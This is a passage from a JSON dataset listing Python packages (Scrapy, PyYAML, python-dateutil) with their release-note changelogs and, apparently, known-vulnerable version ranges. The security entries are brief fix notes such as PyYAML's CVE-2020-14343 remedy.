settings\n~~~~~~~~~~~~~~~~~~~\n\n- added ``HTTPCACHE_ENABLED`` setting (False by default) to enable HTTP cache middleware\n- changed ``HTTPCACHE_EXPIRATION_SECS`` semantics: now zero means \"never expire\".\n\nDeprecated/obsoleted functionality\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Deprecated ``runserver`` command in favor of ``server`` command which starts a Scrapyd server. See also: Scrapyd changes\n- Deprecated ``queue`` command in favor of using Scrapyd ``schedule.json`` API. See also: Scrapyd changes\n- Removed the !LxmlItemLoader (experimental contrib which never graduated to main contrib)\n\n", "0.10": "-----------\n\nThe numbers like NNN reference tickets in the old issue tracker (Trac) which is no longer available.\n\nNew features and improvements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- New Scrapy service called ``scrapyd`` for deploying Scrapy crawlers in production (218) (documentation available)\n- Simplified Images pipeline usage which doesn't require subclassing your own images pipeline now (217)\n- Scrapy shell now shows the Scrapy log by default (206)\n- Refactored execution queue in a common base code and pluggable backends called \"spider queues\" (220)\n- New persistent spider queue (based on SQLite) (198), available by default, which allows to start Scrapy in server mode and then schedule spiders to run.\n- Added documentation for Scrapy command-line tool and all its available sub-commands. (documentation available)\n- Feed exporters with pluggable backends (197) (documentation available)\n- Deferred signals (193)\n- Added two new methods to item pipeline open_spider(), close_spider() with deferred support (195)\n- Support for overriding default request headers per spider (181)\n- Replaced default Spider Manager with one with similar functionality but not depending on Twisted Plugins (186)\n- Split Debian package into two packages - the library and the service (187)\n- Scrapy log refactoring (188)\n- New extension for keeping persistent spider contexts among different runs (203)\n- Added ``dont_redirect`` request.meta key for avoiding redirects (233)\n- Added ``dont_retry`` request.meta key for avoiding retries (234)\n\nCommand-line tool changes\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- New ``scrapy`` command which replaces the old ``scrapy-ctl.py`` (199)\n  - there is only one global ``scrapy`` command now, instead of one ``scrapy-ctl.py`` per project\n  - Added ``scrapy.bat`` script for running more conveniently from Windows\n- Added bash completion to command-line tool (210)\n- Renamed command ``start`` to ``runserver`` (209)\n\nAPI changes\n~~~~~~~~~~~\n\n- ``url`` and ``body`` attributes of Request objects are now read-only (230)\n- ``Request.copy()`` and ``Request.replace()`` now also copies their ``callback`` and ``errback`` attributes (231)\n- Removed ``UrlFilterMiddleware`` from ``scrapy.contrib`` (already disabled by default)\n- Offsite middleware doesn't filter out any request coming from a spider that doesn't have a allowed_domains attribute (225)\n- Removed Spider Manager ``load()`` method. Now spiders are loaded in the ``__init__`` method itself.\n- Changes to Scrapy Manager (now called \"Crawler\"):\n   - ``scrapy.core.manager.ScrapyManager`` class renamed to ``scrapy.crawler.Crawler``\n   - ``scrapy.core.manager.scrapymanager`` singleton moved to ``scrapy.project.crawler``\n- Moved module: ``scrapy.contrib.spidermanager`` to ``scrapy.spidermanager``\n- Spider Manager singleton moved from ``scrapy.spider.spiders`` to the ``spiders` attribute of ``scrapy.project.crawler`` singleton.\n- moved Stats Collector classes: (204)\n   - ``scrapy.stats.collector.StatsCollector`` to ``scrapy.statscol.StatsCollector``\n   - ``scrapy.stats.collector.SimpledbStatsCollector`` to ``scrapy.contrib.statscol.SimpledbStatsCollector``\n- default per-command settings are now specified in the ``default_settings`` attribute of command object class (201)\n- changed arguments of Item pipeline ``process_item()`` method from ``(spider, item)`` to ``(item, spider)``\n   - backward compatibility kept (with deprecation warning)\n- moved ``scrapy.core.signals`` module to ``scrapy.signals``\n   - backward compatibility kept (with deprecation warning)\n- moved ``scrapy.core.exceptions`` module to ``scrapy.exceptions``\n   - backward compatibility kept (with deprecation warning)\n- added ``handles_request()`` class method to ``BaseSpider``\n- dropped ``scrapy.log.exc()`` function (use ``scrapy.log.err()`` instead)\n- dropped ``component`` argument of ``scrapy.log.msg()`` function\n- dropped ``scrapy.log.log_level`` attribute\n- Added ``from_settings()`` class methods to Spider Manager, and Item Pipeline Manager\n\nChanges to settings\n~~~~~~~~~~~~~~~~~~~\n\n- Added ``HTTPCACHE_IGNORE_SCHEMES`` setting to ignore certain schemes on !HttpCacheMiddleware (225)\n- Added ``SPIDER_QUEUE_CLASS`` setting which defines the spider queue to use (220)\n- Added ``KEEP_ALIVE`` setting (220)\n- Removed ``SERVICE_QUEUE`` setting (220)\n- Removed ``COMMANDS_SETTINGS_MODULE`` setting (201)\n- Renamed ``REQUEST_HANDLERS`` to ``DOWNLOAD_HANDLERS`` and make download handlers classes (instead of functions)\n\n", "0.9": "----------\n\nThe numbers like NNN reference tickets in the old issue tracker (Trac) which is no longer available.\n\nNew features and improvements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Added SMTP-AUTH support to scrapy.mail\n- New settings added: ``MAIL_USER``, ``MAIL_PASS`` (:rev:`2065` | 149)\n- Added new scrapy-ctl view command - To view URL in the browser, as seen by Scrapy (:rev:`2039`)\n- Added web service for controlling Scrapy process (this also deprecates the web console. (:rev:`2053` | 167)\n- Support for running Scrapy as a service, for production systems (:rev:`1988`, :rev:`2054`, :rev:`2055`, :rev:`2056`, :rev:`2057` | 168)\n- Added wrapper induction library (documentation only available in source code for now). (:rev:`2011`)\n- Simplified and improved response encoding support (:rev:`1961`, :rev:`1969`)\n- Added ``LOG_ENCODING`` setting (:rev:`1956`, documentation available)\n- Added ``RANDOMIZE_DOWNLOAD_DELAY`` setting (enabled by default) (:rev:`1923`, doc available)\n- ``MailSender`` is no longer IO-blocking (:rev:`1955` | 146)\n- Linkextractors and new Crawlspider now handle relative base tag urls (:rev:`1960` | 148)\n- Several improvements to Item Loaders and processors (:rev:`2022`, :rev:`2023`, :rev:`2024`, :rev:`2025`, :rev:`2026`, :rev:`2027`, :rev:`2028`, :rev:`2029`, :rev:`2030`)\n- Added support for adding variables to telnet console (:rev:`2047` | 165)\n- Support for requests without callbacks (:rev:`2050` | 166)\n\nAPI changes\n~~~~~~~~~~~\n\n- Change ``Spider.domain_name`` to ``Spider.name`` (SEP-012, :rev:`1975`)\n- ``Response.encoding`` is now the detected encoding (:rev:`1961`)\n- ``HttpErrorMiddleware`` now returns None or raises an exception (:rev:`2006` | 157)\n- ``scrapy.command`` modules relocation (:rev:`2035`, :rev:`2036`, :rev:`2037`)\n- Added ``ExecutionQueue`` for feeding spiders to scrape (:rev:`2034`)\n- Removed ``ExecutionEngine`` singleton (:rev:`2039`)\n- Ported ``S3ImagesStore`` (images pipeline) to use boto and threads (:rev:`2033`)\n- Moved module: ``scrapy.management.telnet`` to ``scrapy.telnet`` (:rev:`2047`)\n\nChanges to default settings\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Changed default ``SCHEDULER_ORDER`` to ``DFO`` (:rev:`1939`)\n\n", "0.8": "----------\n\nThe numbers like NNN reference tickets in the old issue tracker (Trac) which is no longer available.\n\nNew features\n~~~~~~~~~~~~\n\n- Added DEFAULT_RESPONSE_ENCODING setting (:rev:`1809`)\n- Added ``dont_click`` argument to ``FormRequest.from_response()`` method (:rev:`1813`, :rev:`1816`)\n- Added ``clickdata`` argument to ``FormRequest.from_response()`` method (:rev:`1802`, :rev:`1803`)\n- Added support for HTTP proxies (``HttpProxyMiddleware``) (:rev:`1781`, :rev:`1785`)\n- Offsite spider middleware now logs messages when filtering out requests (:rev:`1841`)\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Changed ``scrapy.utils.response.get_meta_refresh()`` signature (:rev:`1804`)\n- Removed deprecated ``scrapy.item.ScrapedItem`` class - use ``scrapy.item.Item instead`` (:rev:`1838`)\n- Removed deprecated ``scrapy.xpath`` module - use ``scrapy.selector`` instead. (:rev:`1836`)\n- Removed deprecated ``core.signals.domain_open`` signal - use ``core.signals.domain_opened`` instead (:rev:`1822`)\n- ``log.msg()`` now receives a ``spider`` argument (:rev:`1822`)\n   - Old domain argument has been deprecated and will be removed in 0.9. For spiders, you should always use the ``spider`` argument and pass spider references. If you really want to pass a string, use the ``component`` argument instead.\n- Changed core signals ``domain_opened``, ``domain_closed``, ``domain_idle``\n- Changed Item pipeline to use spiders instead of domains\n   -  The ``domain`` argument of  ``process_item()`` item pipeline method was changed to  ``spider``, the new signature is: ``process_item(spider, item)`` (:rev:`1827` | 105)\n   - To quickly port your code (to work with Scrapy 0.8) just use ``spider.domain_name`` where you previously used ``domain``.\n- Changed Stats API to use spiders instead of domains (:rev:`1849` | 113)\n   - ``StatsCollector`` was changed to receive spider references (instead of domains) in its methods (``set_value``, ``inc_value``, etc).\n   - added ``StatsCollector.iter_spider_stats()`` method\n   - removed ``StatsCollector.list_domains()`` method\n   - Also, Stats signals were renamed and now pass around spider references (instead of domains). Here's a summary of the changes:\n   - To quickly port your code (to work with Scrapy 0.8) just use ``spider.domain_name`` where you previously used ``domain``. ``spider_stats`` contains exactly the same data as ``domain_stats``.\n- ``CloseDomain`` extension moved to ``scrapy.contrib.closespider.CloseSpider`` (:rev:`1833`)\n   - Its settings were also renamed:\n      - ``CLOSEDOMAIN_TIMEOUT`` to ``CLOSESPIDER_TIMEOUT``\n      - ``CLOSEDOMAIN_ITEMCOUNT`` to ``CLOSESPIDER_ITEMCOUNT``\n- Removed deprecated ``SCRAPYSETTINGS_MODULE`` environment variable - use ``SCRAPY_SETTINGS_MODULE`` instead (:rev:`1840`)\n- Renamed setting: ``REQUESTS_PER_DOMAIN`` to ``CONCURRENT_REQUESTS_PER_SPIDER`` (:rev:`1830`, :rev:`1844`)\n- Renamed setting: ``CONCURRENT_DOMAINS`` to ``CONCURRENT_SPIDERS`` (:rev:`1830`)\n- Refactored HTTP Cache middleware\n- HTTP Cache middleware has been heavily refactored, retaining the same functionality except for the domain sectorization which was removed. (:rev:`1843` )\n- Renamed exception: ``DontCloseDomain`` to ``DontCloseSpider`` (:rev:`1859` | 120)\n- Renamed extension: ``DelayedCloseDomain`` to ``SpiderCloseDelay`` (:rev:`1861` | 121)\n- Removed obsolete ``scrapy.utils.markup.remove_escape_chars`` function - use ``scrapy.utils.markup.replace_escape_chars`` instead (:rev:`1865`)\n\n", "0.7": "----------\n\nFirst release of Scrapy.\n\n\n.. _AJAX crawlable urls: https://developers.google.com/search/docs/ajax-crawling/docs/getting-started?csw=1\n.. _boto3: https://github.com/boto/boto3\n.. _botocore: https://github.com/boto/botocore\n.. _chunked transfer encoding: https://en.wikipedia.org/wiki/Chunked_transfer_encoding\n.. _ClientForm: http://wwwsearch.sourceforge.net/old/ClientForm/\n.. _Creating a pull request: https://help.github.com/en/articles/creating-a-pull-request\n.. _cryptography: https://cryptography.io/en/latest/\n.. _docstrings: https://docs.python.org/3/glossary.html#term-docstring\n.. _KeyboardInterrupt: https://docs.python.org/3/library/exceptions.html#KeyboardInterrupt\n.. _LevelDB: https://github.com/google/leveldb\n.. _lxml: https://lxml.de/\n.. _marshal: https://docs.python.org/2/library/marshal.html\n.. _parsel: https://github.com/scrapy/parsel\n.. _parsel.csstranslator.GenericTranslator: https://parsel.readthedocs.io/en/latest/parsel.html#parsel.csstranslator.GenericTranslator\n.. _parsel.csstranslator.HTMLTranslator: https://parsel.readthedocs.io/en/latest/parsel.html#parsel.csstranslator.HTMLTranslator\n.. _parsel.csstranslator.XPathExpr: https://parsel.readthedocs.io/en/latest/parsel.html#parsel.csstranslator.XPathExpr\n.. _PEP 257: https://www.python.org/dev/peps/pep-0257/\n.. _Pillow: https://python-pillow.org/\n.. _pyOpenSSL: https://www.pyopenssl.org/en/stable/\n.. _queuelib: https://github.com/scrapy/queuelib\n.. _registered with IANA: https://www.iana.org/assignments/media-types/media-types.xhtml\n.. _resource: https://docs.python.org/2/library/resource.html\n.. _robots.txt: https://www.robotstxt.org/\n.. _scrapely: https://github.com/scrapy/scrapely\n.. _scrapy-bench: https://github.com/scrapy/scrapy-bench\n.. _service_identity: https://service-identity.readthedocs.io/en/stable/\n.. _six: https://six.readthedocs.io/\n.. _tox: https://pypi.org/project/tox/\n.. _Twisted: https://twistedmatrix.com/trac/\n.. _w3lib: https://github.com/scrapy/w3lib\n.. _w3lib.encoding: https://github.com/scrapy/w3lib/blob/master/w3lib/encoding.py\n.. _What is cacheable: https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9.1\n.. _zope.interface: https://zopeinterface.readthedocs.io/en/latest/\n.. _Zsh: https://www.zsh.org/\n.. _zstandard: https://pypi.org/project/zstandard/\n"}}, {"name": "pyyaml", "insecurity": ["<4", "<5.3.1", "<5.4", ">=5.1,<=5.1.2"], "changelog": {"6.0.1": "\n* https://github.com/yaml/pyyaml/pull/702 -- pin Cython build dep to < 3.0\n\n", "6.0": "\n* https://github.com/yaml/pyyaml/pull/327 -- Change README format to Markdown\n* https://github.com/yaml/pyyaml/pull/483 -- Add a test for YAML 1.1 types\n* https://github.com/yaml/pyyaml/pull/497 -- fix float resolver to ignore `.` and `._`\n* https://github.com/yaml/pyyaml/pull/550 -- drop Python 2.7\n* https://github.com/yaml/pyyaml/pull/553 -- Fix spelling of \u201chexadecimal\u201d\n* https://github.com/yaml/pyyaml/pull/556 -- fix representation of Enum subclasses\n* https://github.com/yaml/pyyaml/pull/557 -- fix libyaml extension compiler warnings\n* https://github.com/yaml/pyyaml/pull/560 -- fix ResourceWarning on leaked file descriptors\n* https://github.com/yaml/pyyaml/pull/561 -- always require `Loader` arg to `yaml.load()`\n* https://github.com/yaml/pyyaml/pull/564 -- remove remaining direct distutils usage\n\n", "5.4.1": "\n* https://github.com/yaml/pyyaml/pull/480 -- Fix stub compat with older pyyaml versions that may unwittingly load it\n\n", "5.4": "\n* https://github.com/yaml/pyyaml/pull/407 -- Build modernization, remove distutils, fix metadata, build wheels, CI to GHA\n* https://github.com/yaml/pyyaml/pull/472 -- Fix for CVE-2020-14343, moves arbitrary python tags to UnsafeLoader\n* https://github.com/yaml/pyyaml/pull/441 -- Fix memory leak in implicit resolver setup\n* https://github.com/yaml/pyyaml/pull/392 -- Fix py2 copy support for timezone objects\n* https://github.com/yaml/pyyaml/pull/378 -- Fix compatibility with Jython\n\n", "5.3.1": "\n* https://github.com/yaml/pyyaml/pull/386 -- Prevents arbitrary code execution during python/object/new constructor\n\n", "5.3": "\n* https://github.com/yaml/pyyaml/pull/290 -- Use `is` instead of equality for comparing with `None`\n* https://github.com/yaml/pyyaml/pull/270 -- Fix typos and stylistic nit\n* https://github.com/yaml/pyyaml/pull/309 -- Fix up small typo\n* https://github.com/yaml/pyyaml/pull/161 -- Fix handling of __slots__\n* https://github.com/yaml/pyyaml/pull/358 -- Allow calling add_multi_constructor with None\n* https://github.com/yaml/pyyaml/pull/285 -- Add use of safe_load() function in README\n* https://github.com/yaml/pyyaml/pull/351 -- Fix reader for Unicode code points over 0xFFFF\n* https://github.com/yaml/pyyaml/pull/360 -- Enable certain unicode tests when maxunicode not > 0xffff\n* https://github.com/yaml/pyyaml/pull/359 -- Use full_load in yaml-highlight example\n* https://github.com/yaml/pyyaml/pull/244 -- Document that PyYAML is implemented with Cython\n* https://github.com/yaml/pyyaml/pull/329 -- Fix for Python 3.10\n* https://github.com/yaml/pyyaml/pull/310 -- Increase size of index, line, and column fields\n* https://github.com/yaml/pyyaml/pull/260 -- Remove some unused imports\n* https://github.com/yaml/pyyaml/pull/163 -- Create timezone-aware datetimes when parsed as such\n* https://github.com/yaml/pyyaml/pull/363 -- Add tests for timezone\n\n", "5.2": "------------------\n\n* Repair incompatibilities introduced with 5.1. The default Loader was changed,\n  but several methods like add_constructor still used the old default\n  https://github.com/yaml/pyyaml/pull/279 -- A more flexible fix for custom tag constructors\n  https://github.com/yaml/pyyaml/pull/287 -- Change default loader for yaml.add_constructor\n  https://github.com/yaml/pyyaml/pull/305 -- Change default loader for add_implicit_resolver, add_path_resolver\n* Make FullLoader safer by removing python/object/apply from the default FullLoader\n  https://github.com/yaml/pyyaml/pull/347 -- Move constructor for object/apply to UnsafeConstructor\n* Fix bug introduced in 5.1 where quoting went wrong on systems with sys.maxunicode <= 0xffff\n  https://github.com/yaml/pyyaml/pull/276 -- Fix logic for quoting special characters\n* Other PRs:\n  https://github.com/yaml/pyyaml/pull/280 -- Update CHANGES for 5.1\n\n", "5.1.2": "------------------\n\n* Re-release of 5.1 with regenerated Cython sources to build properly for Python 3.8b2+\n\n", "5.1.1": "------------------\n\n* Re-release of 5.1 with regenerated Cython sources to build properly for Python 3.8b1\n\n", "5.1": "----------------\n\n* https://github.com/yaml/pyyaml/pull/35 -- Some modernization of the test running\n* https://github.com/yaml/pyyaml/pull/42 -- Install tox in a virtualenv\n* https://github.com/yaml/pyyaml/pull/45 -- Allow colon in a plain scalar in a flow context\n* https://github.com/yaml/pyyaml/pull/48 -- Fix typos\n* https://github.com/yaml/pyyaml/pull/55 -- Improve RepresenterError creation\n* https://github.com/yaml/pyyaml/pull/59 -- Resolves #57, update readme issues link\n* https://github.com/yaml/pyyaml/pull/60 -- Document and test Python 3.6 support\n* https://github.com/yaml/pyyaml/pull/61 -- Use Travis CI built in pip cache support\n* https://github.com/yaml/pyyaml/pull/62 -- Remove tox workaround for Travis CI\n* https://github.com/yaml/pyyaml/pull/63 -- Adding support to Unicode characters over codepoint 0xffff\n* https://github.com/yaml/pyyaml/pull/75 -- add 3.12 changelog\n* https://github.com/yaml/pyyaml/pull/76 -- Fallback to Pure Python if Compilation fails\n* https://github.com/yaml/pyyaml/pull/84 -- Drop unsupported Python 3.3\n* https://github.com/yaml/pyyaml/pull/102 -- Include license file in the generated wheel package\n* https://github.com/yaml/pyyaml/pull/105 -- Removed Python 2.6 & 3.3 support\n* https://github.com/yaml/pyyaml/pull/111 -- Remove commented out Psyco code\n* https://github.com/yaml/pyyaml/pull/129 -- Remove call to `ord` in lib3 emitter code\n* https://github.com/yaml/pyyaml/pull/149 -- Test on Python 3.7-dev\n* https://github.com/yaml/pyyaml/pull/158 -- Support escaped slash in double quotes \"\\/\"\n* https://github.com/yaml/pyyaml/pull/175 -- Updated link to pypi in release announcement\n* https://github.com/yaml/pyyaml/pull/181 -- Import Hashable from collections.abc\n* https://github.com/yaml/pyyaml/pull/194 -- Reverting https://github.com/yaml/pyyaml/pull/74\n* https://github.com/yaml/pyyaml/pull/195 -- Build libyaml on travis\n* https://github.com/yaml/pyyaml/pull/196 -- Force cython when building sdist\n* https://github.com/yaml/pyyaml/pull/254 -- Allow to turn off sorting keys in Dumper (2)\n* https://github.com/yaml/pyyaml/pull/256 -- Make default_flow_style=False\n* https://github.com/yaml/pyyaml/pull/257 -- Deprecate yaml.load and add FullLoader and UnsafeLoader classes\n* https://github.com/yaml/pyyaml/pull/261 -- Skip certain unicode tests when maxunicode not > 0xffff\n* https://github.com/yaml/pyyaml/pull/263 -- Windows Appveyor build\n\n", "3.13": "-----------------\n\n* Resolved issues around PyYAML working in Python 3.7.\n\n", "3.12": "-----------------\n\n* Wheel packages for Windows binaries.\n* Adding an implicit resolver to a derived loader should not affect the base loader.\n* Uniform representation for OrderedDict? across different versions of Python.\n* Fixed comparison to None warning.\n\n", "3.11": "-----------------\n\n* Source and binary distributions are rebuilt against the latest\n  versions of Cython and LibYAML.\n\n", "3.10": "-----------------\n\n* Do not try to build LibYAML bindings on platforms other than CPython\n  (Thank to olt(at)bogosoft(dot)com).\n* Clear cyclic references in the parser and the emitter\n  (Thank to kristjan(at)ccpgames(dot)com).\n* Dropped support for Python 2.3 and 2.4.\n\n", "3.09": "-----------------\n\n* Fixed an obscure scanner error not reported when there is\n  no line break at the end of the stream (Thank to Ingy).\n* Fixed use of uninitialized memory when emitting anchors with\n  LibYAML bindings (Thank to cegner(at)yahoo-inc(dot)com).\n* Fixed emitting incorrect BOM characters for UTF-16 (Thank to\n  Valentin Nechayev)\n* Fixed the emitter for folded scalars not respecting the preferred\n  line width (Thank to Ingy).\n* Fixed a subtle ordering issue with emitting '%TAG' directives\n  (Thank to Andrey Somov).\n* Fixed performance regression with LibYAML bindings.\n\n\n", "3.08": "-----------------\n\n* Python 3 support (Thank to Erick Tryzelaar).\n* Use Cython instead of Pyrex to build LibYAML bindings.\n* Refactored support for unicode and byte input/output streams.\n\n\n", "3.07": "-----------------\n\n* The emitter learned to use an optional indentation indicator\n  for block scalar; thus scalars with leading whitespaces\n  could now be represented in a literal or folded style.\n* The test suite is now included in the source distribution.\n  To run the tests, type 'python setup.py test'.\n* Refactored the test suite: dropped unittest in favor of\n  a custom test appliance.\n* Fixed the path resolver in CDumper.\n* Forced an explicit document end indicator when there is\n  a possibility of parsing ambiguity.\n* More setup.py improvements: the package should be usable\n  when any combination of setuptools, Pyrex and LibYAML\n  is installed.\n* Windows binary packages are built against LibYAML-0.1.2.\n* Minor typos and corrections (Thank to Ingy dot Net\n  and Andrey Somov).\n\n\n", "3.06": "-----------------\n\n* setup.py checks whether LibYAML is installed and if so, builds\n  and installs LibYAML bindings.  To force or disable installation\n  of LibYAML bindings, use '--with-libyaml' or '--without-libyaml'\n  respectively.\n* The source distribution includes compiled Pyrex sources so\n  building LibYAML bindings no longer requires Pyrex installed.\n* 'yaml.load()' raises an exception if the input stream contains\n  more than one YAML document.\n* Fixed exceptions produced by LibYAML bindings.\n* Fixed a dot '.' character being recognized as !!float.\n* Fixed Python 2.3 compatibility issue in constructing !!timestamp values.\n* Windows binary packages are built against the LibYAML stable branch.\n* Added attributes 'yaml.__version__' and  'yaml.__with_libyaml__'.\n\n\n", "3.05": "-----------------\n\n* Windows binary packages were built with LibYAML trunk.\n* Fixed a bug that prevent processing a live stream of YAML documents in\n  timely manner (Thanks edward(at)sweetbytes(dot)net).\n* Fixed a bug when the path in add_path_resolver contains boolean values\n  (Thanks jstroud(at)mbi(dot)ucla(dot)edu).\n* Fixed loss of microsecond precision in timestamps\n  (Thanks edemaine(at)mit(dot)edu).\n* Fixed loading an empty YAML stream.\n* Allowed immutable subclasses of YAMLObject.\n* Made the encoding of the unicode->str conversion explicit so that\n  the conversion does not depend on the default Python encoding.\n* Forced emitting float values in a YAML compatible form.\n\n\n", "3.04": "-----------------\n\n* Include experimental LibYAML bindings.\n* Fully support recursive structures.\n* Sort dictionary keys.  Mapping node values are now represented\n  as lists of pairs instead of dictionaries.  No longer check\n  for duplicate mapping keys as it didn't work correctly anyway.\n* Fix invalid output of single-quoted scalars in cases when a single\n  quote is not escaped when preceded by whitespaces or line breaks.\n* To make porting easier, rewrite Parser not using generators.\n* Fix handling of unexpected block mapping values.\n* Fix a bug in Representer.represent_object: copy_reg.dispatch_table\n  was not correctly handled.\n* Fix a bug when a block scalar is incorrectly emitted in the simple\n  key context.\n* Hold references to the objects being represented.\n* Make Representer not try to guess !!pairs when a list is represented.\n* Fix timestamp constructing and representing.\n* Fix the 'N' plain scalar being incorrectly recognized as !!bool.\n\n\n", "3.03": "-----------------\n\n* Fix Python 2.5 compatibility issues.\n* Fix numerous bugs in the float handling.\n* Fix scanning some ill-formed documents.\n* Other minor fixes.\n\n\n", "3.02": "-----------------\n\n* Fix win32 installer.  Apparently bdist_wininst does not work well\n  under Linux.\n* Fix a bug in add_path_resolver.\n* Add the yaml-highlight example.  Try to run on a color terminal:\n  `python yaml_hl.py <any_document.yaml`.\n\n\n", "3.01": "-----------------\n\n* Initial release.  The version number reflects the codename\n  of the project (PyYAML 3000) and differentiates it from\n  the abandoned PyYaml module.\n\n"}}, {"name": "python-dateutil", "insecurity": [], "changelog": {"2.9.0.post0": "================================\n\nBugfixes\n--------\n\n- Pinned ``setuptools_scm`` to ``<8``, which should make the generated ``_version.py`` file compatible with all supported versions of Python.\n\n\n", "2.9.0": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2024a. (gh pr 1342)\n\n\nFeatures\n--------\n\n- Made all ``dateutil`` submodules lazily imported using `PEP 562\n  <https://www.python.org/dev/peps/pep-0562/>`_. On Python 3.7+, things like\n  ``import dateutil; dateutil.tz.gettz(\"America/New_York\")`` will now work\n  without explicitly importing ``dateutil.tz``, with the import occurring behind\n  the scenes on first use. The old behavior remains on Python 3.6 and earlier.\n  Fixed by Orson Adams. (gh issue 771, gh pr 1007)\n\n\nBugfixes\n--------\n\n- Removed a call to ``datetime.utcfromtimestamp``, which is deprecated as of Python 3.12. Reported by Hugo van Kemenade (gh pr 1284), fixed by Thomas Grainger (gh pr 1285).\n\n\nDocumentation changes\n---------------------\n\n- Added note into docs and tests where relativedelta would return last day of the month\n  only if the same day on a different month resolves to a date that doesn't exist.\n  Reported by hawkEye-01 (gh issue 1167). Fixed by Mifrill (gh pr 1168)\n\n\n", "2.8.2": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2021a. (gh pr 1128)\n\n\nBugfixes\n--------\n\n- Fixed a bug in the parser where non-``ValueError`` exceptions would be raised\n  during exception handling; this would happen, for example, if an\n  ``IllegalMonthError`` was raised in ``dateutil`` code. Fixed by Mark Bailey.\n  (gh issue 981, pr 987).\n- Fixed the custom ``repr`` for ``dateutil.parser.ParserError``, which was not\n  defined due to an indentation error. (gh issue 991, gh pr 993)\n- Fixed a bug that caused ``b'`` prefixes to appear in parse_isodate exception\n  messages. Reported and fixed by Paul Brown (pawl) (gh pr 1122)\n- Make ``isoparse`` raise when trying to parse times with inconsistent use of\n  `:` separator. Reported and fixed by mariocj89 (gh pr 1125).\n- Fixed ``tz.gettz()`` not returning local time when passed an empty string.\n  Reported by labrys (gh issues 925, 926). Fixed by ffe4 (gh pr 1024)\n\n\nDocumentation changes\n---------------------\n\n- Rearranged parser documentation into \"Functions\", \"Classes\" and \"Warnings and\n  Exceptions\" categories. (gh issue 992, pr 994).\n- Updated ``parser.parse`` documentation to reflect the switch from\n  ``ValueError`` to ``ParserError``. (gh issue 992, pr 994).\n- Fixed methods in the ``rrule`` module not being displayed in the docs. (gh pr\n  1025)\n- Changed some relative links in the exercise documentation to refer to the\n  document locations in the input tree, rather than the generated HTML files in\n  the HTML output tree (which presumably will not exist in non-HTML output\n  formats). (gh pr 1078).\n\n\nMisc\n----\n\n- Moved ``test_imports.py``, ``test_internals.py`` and ``test_utils.py`` to\n  pytest.  Reported and fixed by jpurviance (gh pr 978)\n- Added project_urls for documentation and source. Patch by andriyor (gh pr\n  975).\n- Simplified handling of bytes and bytearray in ``_parser._timelex``. Reported\n  and fixed by frenzymadness (gh issue 1060).\n- Changed the tests against the upstream tz database to always generate fat\n  binaries, since until GH-590 and GH-1059 are resolved, \"slim\" zic binaries\n  will cause problems in many zones, causing the tests to fail. This also\n  updates ``zoneinfo.rebuild`` to always generate fat binaries. (gh pr 1076).\n- Moved sdist and wheel generation to use `python-build`. Reported and fixed by\n  mariocj89 (gh pr 1133).\n\n\n", "2.8.1": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to 2019c.\n\n\nBugfixes\n--------\n\n- Fixed a race condition in the ``tzoffset`` and ``tzstr`` \"strong\" caches on\n  Python 2.7. Reported by kainjow (gh issue 901).\n- Parsing errors will now raise ``ParserError``, a subclass of ``ValueError``,\n  which has a nicer string representation. Patch by gfyoung (gh pr 881).\n- ``parser.parse`` will now raise ``TypeError`` when ``tzinfos`` is passed a\n  type that cannot be interpreted as a time zone. Prior to this change, it\n  would raise an ``UnboundLocalError`` instead.  Patch by jbrockmendel (gh pr\n  891).\n- Changed error message raised when when passing a ``bytes`` object as the time\n  zone name to gettz in Python 3.  Reported and fixed by labrys () (gh issue\n  927, gh pr 935).\n- Changed compatibility logic to support a potential Python 4.0 release. Patch\n  by Hugo van Kemenade (gh pr 950).\n- Updated many modules to use ``tz.UTC`` in favor of ``tz.tzutc()`` internally,\n  to avoid an unnecessary function call. (gh pr 910).\n- Fixed issue where ``dateutil.tz`` was using a backported version of\n  ``contextlib.nullcontext`` even in Python 3.7 due to a malformed import\n  statement. (gh pr 963).\n\n\nTests\n-----\n\n- Switched from using assertWarns to using pytest.warns in the test suite. (gh\n  pr 969).\n- Fix typo in setup.cfg causing PendingDeprecationWarning to not be explicitly\n  specified as an error in the warnings filter. (gh pr 966)\n- Fixed issue where ``test_tzlocal_offset_equal`` would fail in certain\n  environments (such as FreeBSD) due to an invalid assumption about what time\n  zone names are provided. Reported and fixed by Kubilay Kocak (gh issue 918,\n  pr 928).\n- Fixed a minor bug in ``test_isoparser`` related to ``bytes``/``str``\n  handling. Fixed by fhuang5 (gh issue 776, gh pr 879).\n- Explicitly listed all markers used in the pytest configuration. (gh pr 915)\n- Extensive improvements to the parser test suite, including the adoption of\n  ``pytest``-style tests and the addition of parametrization of several test\n  cases. Patches by jbrockmendel (gh prs 735, 890, 892, 894).\n- Added tests for tzinfos input types. Patch by jbrockmendel (gh pr 891).\n- Fixed failure of test suite when changing the TZ variable is forbidden.\n  Patch by shadchin (gh pr 893).\n- Pinned all test dependencies on Python 3.3. (gh prs 934, 962)\n\n\nDocumentation changes\n---------------------\n\n- Fixed many misspellings, typos and styling errors in the comments and\n  documentation. Patch by Hugo van Kemenade (gh pr 952).\n\n\nMisc\n----\n\n- Added Python 3.8 to the trove classifiers. (gh pr 970)\n- Moved as many keys from ``setup.py`` to ``setup.cfg`` as possible.  Fixed by\n  FakeNameSE, aquinlan82, jachen20, and gurgenz221 (gh issue 871, gh pr\n  880).\n- Reorganized ``parser`` methods by functionality. Patch by jbrockmendel (gh\n  pr 882).\n- Switched ``release.py`` over to using ``pep517.build`` for creating releases,\n  rather than direct invocations of ``setup.py``. Fixed by smeng10 (gh issue\n  869, gh pr 875).\n- Added a \"build\" environment into the tox configuration, to handle dependency\n  management when making releases. Fixed by smeng10 (gh issue 870,r\n  gh pr 876).\n- GH 916, GH 971\n\n\n", "2.8.0": "==========================\n\nData updates\n------------\n\n- Updated tzdata version to to 2018i.\n\n\nFeatures\n--------\n\n- Added support for ``EXDATE`` parameters when parsing ``rrule`` strings.\n  Reported by mlorant (gh issue 410), fixed by nicoe (gh pr 